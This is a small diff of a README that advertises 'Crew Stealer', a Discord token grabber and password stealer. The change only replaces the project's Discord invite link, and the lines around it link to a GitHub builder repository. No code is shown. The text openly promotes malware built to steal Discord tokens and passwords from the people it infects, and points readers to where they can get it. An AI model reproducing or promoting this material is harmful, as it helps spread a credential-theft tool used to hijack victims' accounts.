@@ -1,4 +1,4 @@
-##### [🌍 Discord Server](https://discord.gg/BedVz5VdwS) - [🕷 Builder](https://github.com/suttonpt/Crew-Stealer-Token-Grabber) - [💡 Features](https://github.com/suttonpt/Crew-Stealer-Token-Grabber/blob/main/README.md) 
+##### [🌍 Discord Server](https://discord.gg/jSz5FvH8je) - [🕷 Builder](https://github.com/suttonpt/Crew-Stealer-Token-Grabber) - [💡 Features](https://github.com/suttonpt/Crew-Stealer-Token-Grabber/blob/main/README.md) 
 
 # Crew Stealer (by Sutton and diazz)
 The new modern discord token grabber & token stealer, with discord password & token even when it changes 
